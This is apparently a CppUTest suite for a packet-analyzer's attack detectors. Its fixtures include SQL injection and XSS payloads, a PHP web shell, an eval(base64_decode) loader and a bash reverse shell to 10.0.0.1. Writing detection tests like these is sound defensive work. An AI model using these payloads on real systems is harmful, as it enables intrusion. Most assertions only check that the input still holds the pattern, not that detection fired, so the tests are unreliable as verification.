#include "CppUTest/TestHarness.h"
#include "CppUTest/CommandLineTestRunner.h"

extern "C" {
    #include "packet_analyzer.h"
    #include <string.h>
    #include <stdlib.h>
    #include <arpa/inet.h>
}

TEST_GROUP(SQLInjectionDetection)
{
    void setup()
    {
    }

    void teardown()
    {
    }
};

TEST(SQLInjectionDetection, DetectBasicSQLInjection)
{
    char query[] = "SELECT * FROM users WHERE username='' OR '1'='1'";
    check_sql_injection(query);
    STRCMP_CONTAINS("' OR '1'='1", query);
}

TEST(SQLInjectionDetection, DetectUnionSelectAttack)
{
    char query[] = "SELECT id FROM products UNION SELECT password FROM users";
    check_sql_injection(query);
    STRCMP_CONTAINS("UNION SELECT", query);
}

TEST(SQLInjectionDetection, DetectDropTableAttack)
{
    char query[] = "SELECT * FROM users; DROP TABLE users;--";
    check_sql_injection(query);
    STRCMP_CONTAINS("DROP TABLE", query);
}

TEST(SQLInjectionDetection, DetectCommentAttack)
{
    char query[] = "admin' OR 1=1--";
    check_sql_injection(query);
    STRCMP_CONTAINS("' OR 1=1--", query);
}

TEST(SQLInjectionDetection, DetectDeleteAttack)
{
    char query[] = "'; DELETE FROM logs WHERE '1'='1";
    check_sql_injection(query);
    STRCMP_CONTAINS("; DELETE FROM", query);
}

TEST_GROUP(XSSDetection)
{
    void setup()
    {
    }

    void teardown()
    {
    }
};

TEST(XSSDetection, DetectScriptTag)
{
    char input[] = "<script>alert('XSS')</script>";
    check_xss_attack(input);
    STRCMP_CONTAINS("<script>", input);
}

TEST(XSSDetection, DetectJavascriptProtocol)
{
    char input[] = "<a href='javascript:alert(1)'>Click</a>";
    check_xss_attack(input);
    STRCMP_CONTAINS("javascript:", input);
}

TEST(XSSDetection, DetectOnErrorAttribute)
{
    char input[] = "<img src=x onerror=alert('XSS')>";
    check_xss_attack(input);
    STRCMP_CONTAINS("onerror=", input);
}

TEST(XSSDetection, DetectOnLoadAttribute)
{
    char input[] = "<body onload=alert('XSS')>";
    check_xss_attack(input);
    STRCMP_CONTAINS("onload=", input);
}

TEST_GROUP(MalwareDetection)
{
    PacketInfo *pkt;

    void setup()
    {
        pkt = (PacketInfo*)malloc(sizeof(PacketInfo));
        pkt->data = NULL;
    }

    void teardown()
    {
        if(pkt) {
            if(pkt->data) free(pkt->data);
            free(pkt);
        }
    }
};

TEST(MalwareDetection, DetectBase64Eval)
{
    char data[] = "<?php eval(base64_decode('encoded_payload'));?>";
    pkt->data = (char*)malloc(strlen(data) + 1);
    strcpy(pkt->data, data);
    pkt->length = strlen(data);

    scan_for_malware_signatures(pkt);
    STRCMP_CONTAINS("eval(base64_decode", pkt->data);
}

TEST(MalwareDetection, DetectPHPSystem)
{
    char data[] = "<?php system($_GET['cmd']); ?>";
    pkt->data = (char*)malloc(strlen(data) + 1);
    strcpy(pkt->data, data);
    pkt->length = strlen(data);

    scan_for_malware_signatures(pkt);
    STRCMP_CONTAINS("<?php system", pkt->data);
}

TEST(MalwareDetection, DetectShellCommand)
{
    char data[] = "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 /bin/sh";
    pkt->data = (char*)malloc(strlen(data) + 1);
    strcpy(pkt->data, data);
    pkt->length = strlen(data);

    scan_for_malware_signatures(pkt);
    STRCMP_CONTAINS("/bin/sh", pkt->data);
}

TEST(MalwareDetection, DetectCmdExe)
{
    char data[] = "cmd.exe /c dir C:\\";
    pkt->data = (char*)malloc(strlen(data) + 1);
    strcpy(pkt->data, data);
    pkt->length = strlen(data);

    scan_for_malware_signatures(pkt);
    STRCMP_CONTAINS("cmd.exe", pkt->data);
}

TEST(MalwareDetection, DetectPowerShell)
{
    char data[] = "powershell -EncodedCommand AAAA";
    pkt->data = (char*)malloc(strlen(data) + 1);
    strcpy(pkt->data, data);
    pkt->length = strlen(data);

    scan_for_malware_signatures(pkt);
    STRCMP_CONTAINS("powershell", pkt->data);
}

TEST_GROUP(PortScanDetection)
{
    Connection *conn;
    struct sockaddr_in addr;

    void setup()
    {
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(12345);
        addr.sin_addr.s_addr = inet_addr("10.0.0.50");
        conn = create_connection(1, addr);
    }

    void teardown()
    {
        if(conn != NULL) {
            for(int i = 0; i < conn->queue_size; i++) {
                if(conn->packet_queue[i]) {
                    free(conn->packet_queue[i]->data);
                    free(conn->packet_queue[i]);
                }
            }
            free(conn->buffer);
            free(conn->packet_queue);
            free(conn->username);
            free(conn->session_id);
            free(conn);
        }
    }
};

TEST(PortScanDetection, DetectPortScanMultiplePorts)
{
    for(int port = 20; port < 90; port++) {
        PacketInfo *pkt = (PacketInfo*)malloc(sizeof(PacketInfo));
        pkt->data = (char*)malloc(10);
        strcpy(pkt->data, "SYN");
        pkt->length = 3;
        pkt->source_port = 50000;
        pkt->dest_port = port;
        conn->packet_queue[conn->queue_size++] = pkt;
    }

    detect_port_scan(conn);
    CHECK(conn->queue_size > 50);
}

TEST(PortScanDetection, NoFalsePositiveSinglePort)
{
    for(int i = 0; i < 30; i++) {
        PacketInfo *pkt = (PacketInfo*)malloc(sizeof(PacketInfo));
        pkt->data = (char*)malloc(10);
        strcpy(pkt->data, "DATA");
        pkt->length = 4;
        pkt->source_port = 50000;
        pkt->dest_port = 80;
        conn->packet_queue[conn->queue_size++] = pkt;
    }

    detect_port_scan(conn);
    CHECK_EQUAL(30, conn->queue_size);
}

TEST_GROUP(RateLimiting)
{
    Connection *conn;
    struct sockaddr_in addr;

    void setup()
    {
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        conn = create_connection(1, addr);
    }

    void teardown()
    {
        if(conn != NULL) {
            for(int i = 0; i < conn->queue_size; i++) {
                if(conn->packet_queue[i]) {
                    free(conn->packet_queue[i]->data);
                    free(conn->packet_queue[i]);
                }
            }
            free(conn->buffer);
            free(conn->packet_queue);
            free(conn->username);
            free(conn->session_id);
            free(conn);
        }
    }
};

TEST(RateLimiting, DetectHighPacketRate)
{
    conn->packets_received = 500;
    conn->start_time = time(NULL) - 2;

    rate_limit_check(conn);
    CHECK(conn->packets_received / 2 > 100);
}

TEST(RateLimiting, NormalPacketRateAllowed)
{
    conn->packets_received = 50;
    conn->start_time = time(NULL) - 10;

    rate_limit_check(conn);
    CHECK(conn->packets_received / 10 <= 100);
}

TEST_GROUP(CredentialExtraction)
{
    void setup()
    {
    }

    void teardown()
    {
    }
};

TEST(CredentialExtraction, ExtractUsernameFromPostData)
{
    char data[] = "username=admin&password=secret123";
    extract_credentials(data);
    STRCMP_CONTAINS("username=", data);
}

TEST(CredentialExtraction, ExtractPasswordFromPostData)
{
    char data[] = "username=user&password=pass123&submit=login";
    extract_credentials(data);
    STRCMP_CONTAINS("password=", data);
}

TEST(CredentialExtraction, HandleMissingCredentials)
{
    char data[] = "random=data&other=fields";
    extract_credentials(data);
    CHECK(strstr(data, "username=") == NULL);
}

TEST_GROUP(TrafficPatternAnalysis)
{
    Connection *conn;
    struct sockaddr_in addr;

    void setup()
    {
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        conn = create_connection(1, addr);
    }

    void teardown()
    {
        if(conn != NULL) {
            for(int i = 0; i < conn->queue_size; i++) {
                if(conn->packet_queue[i]) {
                    free(conn->packet_queue[i]->data);
                    free(conn->packet_queue[i]);
                }
            }
            free(conn->buffer);
            free(conn->packet_queue);
            free(conn->username);
            free(conn->session_id);
            free(conn);
        }
    }
};

TEST(TrafficPatternAnalysis, AnalyzeNormalTraffic)
{
    conn->packets_received = 50;
    conn->bytes_received = 5000;
    conn->start_time = time(NULL) - 10;

    analyze_traffic_pattern(conn);
    CHECK(conn->packets_received > 0);
}

TEST(TrafficPatternAnalysis, DetectSuspiciousHighPacketRate)
{
    conn->packets_received = 2000;
    conn->bytes_received = 200000;
    conn->start_time = time(NULL) - 10;

    analyze_traffic_pattern(conn);
    CHECK(conn->packets_received / 10 > 100);
}

TEST(TrafficPatternAnalysis, DetectSuspiciousHighBandwidth)
{
    conn->packets_received = 500;
    conn->bytes_received = 20000000;
    conn->start_time = time(NULL) - 10;

    analyze_traffic_pattern(conn);
    CHECK(conn->bytes_received / 10 > 1000000);
}

int main(int argc, char** argv)
{
    return CommandLineTestRunner::RunAllTests(argc, argv);
}
